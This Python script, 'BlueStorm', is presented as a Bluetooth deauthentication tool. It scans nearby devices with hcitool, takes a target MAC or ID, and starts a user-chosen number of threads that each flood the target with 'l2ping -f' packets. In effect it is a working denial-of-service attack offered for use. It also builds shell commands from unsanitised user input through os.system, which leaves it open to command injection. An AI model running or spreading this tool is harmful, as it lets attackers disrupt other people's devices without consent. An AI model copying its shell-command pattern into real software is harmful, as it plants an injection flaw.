# BlueStorm
# A tool which perform deauthentication attack on unpaired bluetooth devices.
# Author - WireBits

import os
import threading
import time
import subprocess

def scan_attack():
    logo()
    while True:
        menu()
        choice = input("|-->Enter your choice (1 or 2) > ")
        if choice == '1':
            break
        elif choice == '2':
            print("Exiting...")
            exit(0)
        else:
            print("Invalid choice! Please enter 1 or 2.")

    time.sleep(0.1)
    os.system('clear')
    logo()
    print('')
    print("Scanning...")
    bluetooth_scan = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
    lines = bluetooth_scan.splitlines()
    id = 1
    del lines[0]
    array = []
    print("---------------------------------------------------------------")
    print("    ID   |        MAC Address        |       Device Name       ")
    print("---------------------------------------------------------------")
    for line in lines:
        info = line.split()
        device_mac = info[0]
        device_name=''.join(info[1:])
        array.append(device_mac)
        print("    {}    |     {}     |  {}          ".format(id,device_mac,device_name))
        id = id + 1
        print("---------------------------------------------------------------")
    target_id = input('Target ID or MAC Address > ')
    try:
        target_address = array[int(target_id)]
    except:
        target_address = target_id


    if len(target_address) < 1:
        print('[!] Target address is missing!')
        exit(0)

    try:
        packet_size = int(input('Packet Size (Max : 600) > '))
    except:
        print('[!] Packet size must be an integer!')
        exit(0)
    try:
        threads_count = int(input('Threads Count > '))
    except:
        print('[!] Threads count must be an integer!')
        exit(0)
    print('')
    os.system('clear')

    for i in range(0, 3):
        countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
        print(countdown_message, end='\r')
        time.sleep(1)
    os.system('clear')
    print('[*] Building threads...\n')

    for i in range(0, threads_count):
        print('[*] Built thread no:' + str(i + 1))
        threading.Thread(target=deauth, args=[str(target_address), str(packet_size)]).start()

    print('[*] All threads are ready!')
    print('[*] Started!')

def deauth(target_address, packet_size):
    os.system('l2ping -i hci0 -s ' + str(packet_size) +' -f ' + target_address)

def menu():
    print('')
    print("+------------------+")
    print("|-Choose an option-|")
    print("+------------------+")
    print("|-->1. Scan and attack")
    print("|-->2. Quit")

def logo():
    print("\t\t\t\t\t\t+-------------------------------+")
    print("\t\t\t\t\t\t|--╔╗ ╦  ╦ ╦╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗--|")
    print("\t\t\t\t\t\t|--╠╩╗║  ║ ║║╣ ╚═╗ ║ ║ ║╠╦╝║║║--|")
    print("\t\t\t\t\t\t|--╚═╝╩═╝╚═╝╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩--|")
    print("\t\t\t\t\t\t|Bluetooth Deauthentication Tool|")
    print("\t\t\t\t\t\t+-------------------------------+")

if __name__ == '__main__':
    try:
        os.system('clear')
        scan_attack()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
